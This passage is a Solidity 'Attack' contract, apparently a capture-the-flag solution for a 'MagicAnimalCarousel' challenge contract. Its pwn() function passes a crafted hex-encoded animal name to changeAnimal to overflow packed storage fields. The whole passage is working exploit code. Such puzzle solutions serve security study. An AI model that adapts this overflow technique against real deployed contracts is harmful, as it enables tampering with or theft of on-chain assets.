...
contract Attack {
    IMagicAnimalCarousel mac;

    constructor(address _addr) {
        mac = IMagicAnimalCarousel(_addr);
    }

    function pwn() external {
        mac.setAnimalAndSpin("Dog");

        string memory animalNameOverflow = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        mac.changeAnimal(animalNameOverflow, uint256(1));
    }
}